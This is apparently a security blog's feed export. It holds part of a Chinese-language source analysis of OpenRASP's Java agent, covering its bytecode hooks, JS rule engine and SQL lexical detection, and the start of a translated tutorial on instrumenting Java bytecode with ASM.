Instrumentation允许开发者添加自定义的字节码转换器来对Java字节码进行自定义的操作转化，从而实现在不修改源代码的情况下，实现AOP。当然，有一些开源的Java字节码类库帮助开发者操作Java字节码。OpenRASP的开发者选择了ASM这个框架，相比其他的框架，ASM的优点是更加底层、更加灵活，功能也更加丰富。</p><p>OpenRASP另一个值得称道的做法是使用了js来编写规则，通过Java语言实现的js引擎来执行脚本。OpenRASP官网关于为什么用JavaScript实现检测的逻辑的解释是 OpenRASP会支持PHP、DotNet、NodeJS、Python、Ruby等多种开发语言，为了避免在不同平台上重新实现检测逻辑，引入了插件系统; 选择JS作为插件开发语言。当然，这是优点之一。笔者认为，另一个优点是使用JS插件系统可以很方便的支持热部署。笔者曾经有幸参与某商业RASP产品的研发和测试，各语言规则的重复编写和热部署是两个令我们头痛的问题，而使用js引擎就可以很好的解决这两个问题。</p><h2 id="0x04-Talk-is-cheap"><a href="#0x04-Talk-is-cheap" class="headerlink" title="0x04 Talk is cheap"></a>0x04 Talk is cheap</h2><p>俗话说，Talk is cheap，show me the code. 下面简要分析一下OpenRASP的代码。OpenRASP是一个Java Instrumentation，它的入口是<code>public static void premain(String agentArg, Instrumentation inst)</code>函数，OpenRASP中的<code>premain</code>方法在<code>com.fuxi.javaagent.Agent</code>中。这个方法中主要的代码如下<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//........省略部分代码........</span></span><br><span class="line">JarFileHelper.addJarToBootstrap(inst);</span><br><span class="line"><span class="comment">//........省略部分代码........</span></span><br><span class="line">PluginManager.init();</span><br><span class="line">initTransformer(inst);</span><br><span class="line"><span class="comment">//........省略部分代码........</span></span><br></pre></td></tr></table></figure></p><p><code>JarFileHelper.addJarToBootstrap(inst)</code>的关键是JarFileHelper中<code>inst.appendToBootstrapClassLoaderSearch(new JarFile(localJarPath))</code>这行代码，它的作用是将rasp.jar加入到bootstrap classpath里，优先其他jar被加载。在Java Instrumention的实现中，这行代码应该是很常见的。为什么要这样做呢？在Java中，Java类加载器分为BootstrapClassLoader、ExtensionClassLoader和SystemClassLoader。BootstrapClassLoader主要加载的是JVM自身需要的类，由于双亲委派机制的存在，越基础的类由越上层的加载器进行加载，因此，如果需要在由BootstrapClassLoader加载的类的方法中调用由SystemClassLoader加载的rasp.jar，这违反了双亲委派机制。所以，而rasp.jar添加到BootstrapClassLoader的classpath中，由BootstrapClassLoader加载，就解决了这个问题。</p><p>接着是<code>PluginManager.init()</code>，初始化插件系统。<code>PluginManager.init()</code>的具体代码如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">JSContextFactory.init();</span><br><span class="line">updatePlugin();</span><br><span class="line">initFileWatcher();</span><br></pre></td></tr></table></figure></p><p><code>JSContextFactory.init()</code>的主要作用是初始化js引擎，这里使用的js引擎是Mozilla的Rhino，Mozilla旗下提供了各种语言的js引擎的成熟实现，例如用C/C++实现的js引擎SpiderMonkey等。<code>JSContextFactory.init()</code>先初始化了js引擎，执行了一堆js文件，笔者js水平有限，就不分析了。接着把jsstdout注入到js环境中，处理js环境中的输出。把JSTokenizeSql和JSRASPConfig注入到RASP对象中，为js环境提供sql_tokenize方法，提供对SQL语句进行tokenize的能力。接下来<code>updatePlugin()</code>方法读取插件目录下的js文件，执行js脚本，加载插件。<code>initFileWatcher()</code>添加了文件监控，一旦插件目录下的js文件发送变化，则调用<code>updatePluginAsync()</code>执行clean方法，执行js脚本，更新插件，实现热部署功能。</p><p>接下来是<code>initTransformer(inst)</code>方法，它调用<code>inst.addTransformer(new CustomClassTransformer(), true)</code>方法添加了CustomClassTransformer这个Class转换器，这样，每一个类的字节码在加载之前都会调用<code>CustomClassTransformer.transform(..)</code>（参数省略）方法，对字节码进行更改之后，字节码被载入JVM中，接下来继续类加载过程：加载-&gt;验证-&gt;准备-&gt;解析-&gt;初始化。<code>CustomClassTransformer</code>类在初始化的时候创建了很多个ClassHook对象，代码如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">CustomClassTransformer</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        hooks = <span class="keyword">new</span> HashSet&lt;AbstractClassHook&gt;();</span><br><span class="line"></span><br><span class="line">        addHook(<span class="keyword">new</span> WebDAVCopyResourceHook());</span><br><span class="line">        addHook(<span class="keyword">new</span> CoyoteInputStreamHook());</span><br><span class="line">        addHook(<span class="keyword">new</span> DeserializationHook());</span><br><span class="line">        addHook(<span class="keyword">new</span> DiskFileItemHook());</span><br><span class="line">        addHook(<span class="keyword">new</span> FileHook());</span><br><span class="line">        <span class="comment">//.....省略......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>我们看一下<code>CustomClassTransformer.transform(..)</code>这个方法，如果当前加载的类是需要转换的，即<code>hook.isClassMatched(className)</code>返回true，就会调用<code>hook.transformClass(className, classfileBuffer)</code>对字节码进行转化。<code>transformClass</code>的代码在<code>com.fuxi.javaagent.hook.AbstractClassHook</code>中，如下所示：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">byte</span>[] transformClass(String className, <span class="keyword">byte</span>[] classfileBuffer) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ClassReader reader = <span class="keyword">new</span> ClassReader(classfileBuffer);</span><br><span class="line">            ClassWriter writer = <span class="keyword">new</span> ClassWriter(reader, computeFrames() ? ClassWriter.COMPUTE_FRAMES : ClassWriter.COMPUTE_MAXS);</span><br><span class="line">            LOGGER.debug(<span class="string">"transform class: "</span> + className);</span><br><span class="line">            ClassVisitor visitor = <span class="keyword">new</span> RaspHookClassVisitor(<span class="keyword">this</span>, writer);</span><br><span class="line">            reader.accept(visitor, ClassReader.EXPAND_FRAMES);</span><br><span class="line">            <span class="keyword">return</span> writer.toByteArray();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RuntimeException e) &#123;</span><br><span class="line">            LOGGER.error(<span class="string">"exception"</span>, e);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>这段代码调用了ASM库，关于ASM库的详情请看<a href="http://web.cs.ucla.edu/~msb/cs239-tutorial/" target="_blank" rel="noopener">这里</a>，为了方便读者，笔者翻译了一下，在<a href="https://c0d3p1ut0s.github.io/%E8%AF%91-%E4%BD%BF%E7%94%A8ASM%E5%AF%B9Java%E5%AD%97%E8%8A%82%E7%A0%81%E6%8F%92%E6%A1%A9/">这里</a>。如上文中所说，ASM是一个强大的字节码操作库。它主要使用了设计模式中的访问者模式，使用访问者模式的好处是数据结构与数据操作分开。在ASM中哪些是数据结构呢？转换前字节码中类、方法、注释、成员变量等就是数据结构，对这些字节码的操作就是数据操作。在ASM中，开发者不需要关心ASM解析字节码，遍历类、方法、注释等是怎样实现，只需要知道<code>ClassReader.accept()</code>接受一个ClassVisitor实例作为参数，在ASM遍历类、方法、注释时，ASM会调用<code>ClassVisitor.visitMethod()</code>、<code>ClassVisitor.visitAnnotation()</code>等方法。开发只需要重写这些方法，就可以操作方法、注释的字节码。如上面的代码所示，OpenRASP开发者创建了一个RaspHookClassVisitor类，重写了<code>visit</code>和<code>visitMethod</code>方法。在<code>visitMethod</code>方法中，ClassHook的<code>hookMethod</code>方法被调用，下面以FileHook为例，看一下<code>hookMethod</code>方法：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> MethodVisitor <span class="title">hookMethod</span><span class="params">(<span class="keyword">int</span> access, String name, String desc, String signature, String[] exceptions, MethodVisitor mv)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (name.equals(<span class="string">"listFiles"</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> AdviceAdapter(Opcodes.ASM5, mv, access, name, desc) &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onMethodEnter</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                    loadThis();</span><br><span class="line">                    invokeStatic(Type.getType(HookHandler.class),</span><br><span class="line">                            <span class="keyword">new</span> Method(<span class="string">"checkListFiles"</span>, <span class="string">"(Ljava/io/File;)V"</span>));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> mv;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p><code>invokeStatic(Type.getType(HookHandler.class),new Method(&quot;checkListFiles&quot;, &quot;(Ljava/io/File;)V&quot;)</code>这行代码调用了静态方法<code>HookHandler.checkListFiles</code>来实现对<code>java.io.File.listFiles</code>方法的检测。</p><p>各关键函数的检测有些区别，我就不分析了，很多都是最后调用<code>com.fuxi.javaagent.plugin.check</code>进行检测，而<code>com.fuxi.javaagent.plugin.check</code>最后调用了各js函数来检测。代码如下<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">checkProcess = processList.get(i);</span><br><span class="line">function = checkProcess.getFunction();</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    tmp = function.call(<span class="keyword">this</span>, scope, function, functionArgs);</span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">//......省略......</span></span><br></pre></td></tr></table></figure></p><p>对检测细节感兴趣的可以一个一个跟。</p><h2 id="0x05-关于OpenRASP规则的几点说明"><a href="#0x05-关于OpenRASP规则的几点说明" class="headerlink" title="0x05 关于OpenRASP规则的几点说明"></a>0x05 关于OpenRASP规则的几点说明</h2><p>OpenRASP提供了一些官方插件，当然，相关的规则还是需要根据业务和开发水平来定制。开发者水平参差不齐，什么奇葩的实现方式都有。例如，笔者之前参与研发的RASP也有这么一条规则：禁止在SQL语句中出现常量比较操作。但是，这条规则在实际中却有不少误报。很多开发会这样写(用伪代码表示一下)：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">String sql=<span class="string">"select * from table where 1=1"</span>;</span><br><span class="line"><span class="keyword">for</span>(key,value in condition.items())&#123;</span><br><span class="line">    sql+=<span class="string">" and "</span>+key+<span class="string">"="</span>+<span class="string">"value"</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>开发会自己添加1=1，为了能方便的在循环中在SQL后面的where语句中直接加and，而1=1永远为真，不影响后面的逻辑。所以说，规则永远是和场景分不开的，同样，不深入开发、不深入客户很难做好安全产品。说白了，做安全，开发安全产品和软件工程的目标是一致的，即让大多数的Stakeholder(利益相关者)满意。开发当然也是RASP产品的Stakeholder。好了，扯远了。</p><p>OpenRASP中对SQL做了词法分析来实现”零规则”检测。实际上，词法分析的主要作用是将SQL语句分割成数据和代码。SQL注入的本质是代码注入，有了词法分析的帮助，Web层就可以判断对SQL语句的字符串处理是否改变了SQL的逻辑。这是词法分析为什么可以用来检测SQL注入的原因，类似的，利用词法分析也可以检测其他代码注入。不过把SQL的词法分析做好并不容易，一个原因是SQL语句语法复杂，不同的数据库有不同的语法，不同的数据库还有不同的奇葩特性。从代码来看OpenRASP的词法分析暂时还没有区分不同的数据库。</p><p>RASP并不能高效地防御所有的漏洞，还是那句话，Web服务器、解释器/JVM、数据库、操作系统各有各的防御阵地，各有各的优势，充分发挥它们的优势，才能更好的做好安全防护。希望这篇文章能对想用RASP产品或者想研发RASP的公司有一些帮助。</p><h2 id="0x06-Reference"><a href="#0x06-Reference" class="headerlink" title="0x06 Reference"></a>0x06 Reference</h2><ul><li><a href="https://rasp.baidu.com/" target="_blank" rel="noopener">OpenRASP官网</a></li><li><a href="http://asm.ow2.org/" target="_blank" rel="noopener">ASM</a></li><li><a href="http://blog.nsfocus.net/openrasp-tech/" target="_blank" rel="noopener">绿盟博客</a></li></ul><h2 id="0x07-关于作者"><a href="#0x07-关于作者" class="headerlink" title="0x07 关于作者"></a>0x07 关于作者</h2><ul><li><a href="https://c0d3p1ut0s.github.io/">我的博客</a></li><li>c0d3p1ut0s c0d3p1ut0s@gmail.com</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;RASP（Runtime Application self-protection）是一种在运行时检测
      
    
    </summary>
    
    
      <category term="Java安全" scheme="http://c0d3p1ut0s.github.io/tags/Java%E5%AE%89%E5%85%A8/"/>
    
      <category term="Web安全" scheme="http://c0d3p1ut0s.github.io/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="http://c0d3p1ut0s.github.io/tags/Java/"/>
    
      <category term="RASP" scheme="http://c0d3p1ut0s.github.io/tags/RASP/"/>
    
  </entry>
  
  <entry>
    <title>[译]使用ASM对Java字节码插桩</title>
    <link href="http://c0d3p1ut0s.github.io/%E8%AF%91-%E4%BD%BF%E7%94%A8ASM%E5%AF%B9Java%E5%AD%97%E8%8A%82%E7%A0%81%E6%8F%92%E6%A1%A9/"/>
    <id>http://c0d3p1ut0s.github.io/译-使用ASM对Java字节码插桩/</id>
    <published>2017-12-27T14:19:23.000Z</published>
    <updated>2017-12-27T15:02:41.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>翻译自 <a href="http://web.cs.ucla.edu/~msb/cs239-tutorial/" target="_blank" rel="noopener">http://web.cs.ucla.edu/~msb/cs239-tutorial/</a></p></blockquote><p>在这篇文章中，你将学会如何使用ASM框架对java class文件插桩。文章第一部分介绍Java字节码以及如何阅读class文件。第二部分介绍贯穿ASM框架的vistor模式。第三部分我们将用ASM构建一个简单的调用链跟踪插桩。</p><a id="more"></a><h2 id="第一部分：Java字节码"><a href="#第一部分：Java字节码" class="headerlink" title="第一部分：Java字节码"></a>第一部分：Java字节码</h2><p>ASM是一个Java字节码操作框架，首先介绍一下Java字节码。Java字节码是Java虚拟机（JVM）的指令集。每一条指令由一个字节的操作码和0个或者多个操作数组成。例如”iadd”,它接收两个整数作为操作数。你可以在<a href="https://en.wikipedia.org/wiki/Java_bytecode_instruction_listings" target="_blank" rel="noopener">这里</a>查看操作指令和操作数的细节。下面有一个简单的列表帮助我们更好地了解java字节码：</p><ul><li>加载和存储（例如：aload_0, istore）</li><li>数学和逻辑运算（例如：ladd, fcmpl）</li><li>类型转换（例如：i2b, d2i）</li><li>对象创建和操作（例如：new, putfield）</li><li>操作数栈管理（例如：swap, dup2）</li><li>控制转移（例如：ifeq, goto）</li><li>方法调用和返回（例如：invokespecial, areturn）</li></ul><h3 id="Java虚拟机："><a href="#Java虚拟机：" class="headerlink" title="Java虚拟机："></a>Java虚拟机：</h3><p>要理解java字节码的细节，我们需要了解JVM如何执行字节码。JVM是一个与平台无关的执行环境，它将java字节码转换为机器语言，然后执行。JVM是基于栈的虚拟机，每个线程都有一个JVM栈，这个栈由栈帧（Stack Frame）组成。每次方法调用会创建一个栈帧，一个栈帧由一个操作数栈、一个本地变量数组和指向当方法所在的类的运行时常量池的指针组成。</p><p><img src="http://web.cs.ucla.edu/~msb/cs239-tutorial/images/image02.gif" alt="171227_01.gif"></p><p>在<a href="http://www.artima.com/insidejvm/ed2/jvm.html" target="_blank" rel="noopener">这里</a>可以更深入了解JVM</p><h3 id="基于栈的虚拟机："><a href="#基于栈的虚拟机：" class="headerlink" title="基于栈的虚拟机："></a>基于栈的虚拟机：</h3><p>我们需要一些基于栈的虚拟机的背景知识以便更好的了解Java字节码。对于一个基于栈的虚拟机来说，它存储操作数的内存结构是栈。操作数以LIFO（Last In First Out）的方式从栈顶弹出，被操作之后被压入栈中。在基于栈的虚拟机中，两个数相加的操作如下所示（20、7和结果是操作数）</p><p><img src="http://web.cs.ucla.edu/~msb/cs239-tutorial/images/image00.png" alt="171227_02.png"></p><p>如果你对这部分感兴趣，你可以看<a href="https://markfaction.wordpress.com/2012/07/15/stack-based-vs-register-based-virtual-machine-architecture-and-the-dalvik-vm/" target="_blank" rel="noopener">这里</a>获取更多关于基于栈和基于寄存器的虚拟机的更多细节</p><p>例如如下代码<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        printOne();</span><br><span class="line">        printOne();</span><br><span class="line">        printTwo();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">printOne</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Hello World"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">printTwo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        printOne();</span><br><span class="line">        printOne();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>我们用javac来编译java程序，然后使用javap -c来反编译class文件。Java class文件（即后缀是.class的文件）包含JVM中运行的java字节码，Java class文件是由java编译器对java源代码编译之后产生的。反编译class文件如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">Test</span><span class="params">()</span></span>;</span><br><span class="line">    Code:</span><br><span class="line">       <span class="number">0</span>: aload_0       </span><br><span class="line">       1: invokespecial #1                  // Method java/lang/Object."":()V</span><br><span class="line">       <span class="number">4</span>: <span class="keyword">return</span>        </span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(java.lang.String[])</span></span>;</span><br><span class="line">    Code:</span><br><span class="line">       0: invokestatic  #2                  // Method printOne:()V</span><br><span class="line">       3: invokestatic  #2                  // Method printOne:()V</span><br><span class="line">       6: invokestatic  #3                  // Method printTwo:()V</span><br><span class="line">       <span class="number">9</span>: <span class="keyword">return</span>        </span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">printOne</span><span class="params">()</span></span>;</span><br><span class="line">    Code:</span><br><span class="line">       0: getstatic     #4                  // Field java/lang/System.out:Ljava/io/PrintStream;</span><br><span class="line">       3: ldc           #5                  // String Hello World</span><br><span class="line">       5: invokevirtual #6                  // Method java/io/PrintStream.println:(Ljava/lang/String;)V</span><br><span class="line">       <span class="number">8</span>: <span class="keyword">return</span>        </span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">printTwo</span><span class="params">()</span></span>;</span><br><span class="line">    Code:</span><br><span class="line">       0: invokestatic  #2                  // Method printOne:()V</span><br><span class="line">       3: invokestatic  #2                  // Method printOne:()V</span><br><span class="line">       <span class="number">6</span>: <span class="keyword">return</span>        </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>分析：</p><ul><li>首先看一下public Test()这个构造函数，它包含三个操作指令，第一个是aload_0，它把本地变量表中索引为0的值压入操作数栈。本地变量表是用来传递函数参数的。下一个操作指令invokespecial调用这个类父类的构造器，所有没有明确指明父类的类都继承自java.lang.Object，编译器提供了必要的字节码来调用这个基类的构造器。在这条操作指令执行时，操作数栈最顶部的值this被弹出。最后一条指令return返回应该被返回的值。操作指令的索引不连续是因为有的操作指令有参数，需要在字节码数组中占用位置。</li><li>#number 是常量池中的索引。常量池是一个包含字符串常量、类和接口名字、变量名字和其他常量的表。我们可以使用”javap -c -v”来查看整个常量池。</li><li>java语言设置了两种方法，实例方法（invokevirtual）和类方法（invokestatic）。当Java虚拟机调用一个类方法时，它根据对象的引用类型来选择方法，这是在编译时就确定的。而实例方法的调用取决于对象的真正的类，这可能只在运行时才能知道。</li><li>可以从<a href="http://www.ibm.com/developerworks/library/it-haggar_bytecode/" target="_blank" rel="noopener">这篇</a>优秀的文章了解到关于更多java字节码的知识。</li></ul><h2 id="第二部分-访问者模式"><a href="#第二部分-访问者模式" class="headerlink" title="第二部分 访问者模式"></a>第二部分 访问者模式</h2><p>在面向对象编程和软件工程中，访问者模式是一种把数据结构和操作这个数据结构的算法分开的模式。这种分离能方便的添加新的操作而无需更改数据结构。</p><p>实质上，访问者允许一个类族添加新的虚函数而不修改类本身。但是，创建一个访问者类可以实现虚函数所有的特性。访问者接收实例引用作为输入，使用双重调用实现这个目标。</p><p>访问者模式要求程序语言支持单一调用。在这一条件下，我们创建两个不同类的对象，一个是element，另一个是vistor。element有一个accept()方法接收vistor实例作为参数。accept()方法调用vistor的visit()方法；element类将它自己作为参数传入visit方法。</p><p>在下面这个例子中，我们使用的访问者模式和ASM来操作字节码的模式相似。</p><ol><li>添加void accept(Vistor v)到Element类</li><li>创建一个vistor基类，基类中包含每一种元素类的visit()方法</li><li>创建一个vistor派生类，实现基类对Element的所有操作。</li><li>使用者创建vistor对象，调用元素的accept方法并传递vistor实例作为参数。</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Element</span> </span>&#123;</span><br><span class="line">   <span class="comment">// 1. accept(Visitor) interface</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">accept</span><span class="params">( Visitor v )</span></span>; <span class="comment">// first dispatch</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">This</span> <span class="keyword">implements</span> <span class="title">Element</span> </span>&#123;</span><br><span class="line">   <span class="comment">// 1. accept(Visitor) implementation</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span>   <span class="title">accept</span><span class="params">( Visitor v )</span> </span>&#123;</span><br><span class="line">     v.visit( <span class="keyword">this</span> );</span><br><span class="line">   &#125; </span><br><span class="line">   <span class="function"><span class="keyword">public</span> String <span class="title">thiss</span><span class="params">()</span> </span>&#123;</span><br><span class="line">     <span class="keyword">return</span> <span class="string">"This"</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">That</span> <span class="keyword">implements</span> <span class="title">Element</span> </span>&#123;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span>   <span class="title">accept</span><span class="params">( Visitor v )</span> </span>&#123;</span><br><span class="line">     v.visit( <span class="keyword">this</span> );</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> String <span class="title">that</span><span class="params">()</span> </span>&#123;</span><br><span class="line">     <span class="keyword">return</span> <span class="string">"That"</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TheOther</span> <span class="keyword">implements</span> <span class="title">Element</span> </span>&#123;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span>   <span class="title">accept</span><span class="params">( Visitor v )</span> </span>&#123;</span><br><span class="line">     v.visit( <span class="keyword">this</span> );</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> String <span class="title">theOther</span><span class="params">()</span> </span>&#123;</span><br><span class="line">     <span class="keyword">return</span> <span class="string">"TheOther"</span>; </span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. Create a "visitor" base class with a visit() method for every "element" type</span></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Visitor</span> </span>&#123;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visit</span><span class="params">( This e )</span></span>; <span class="comment">// second dispatch</span></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visit</span><span class="params">( That e )</span></span>;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visit</span><span class="params">( TheOther e )</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. Create a "visitor" derived class for each "operation" to perform on "elements"</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UpVisitor</span> <span class="keyword">implements</span> <span class="title">Visitor</span> </span>&#123;                   </span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visit</span><span class="params">( This e )</span> </span>&#123;</span><br><span class="line">      System.out.println( <span class="string">"do Up on "</span> + e.thiss() );</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visit</span><span class="params">( That e )</span> </span>&#123;</span><br><span class="line">      System.out.println( <span class="string">"do Up on "</span> + e.that() );</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visit</span><span class="params">( TheOther e )</span> </span>&#123;</span><br><span class="line">      System.out.println( <span class="string">"do Up on "</span> + e.theOther() );</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span 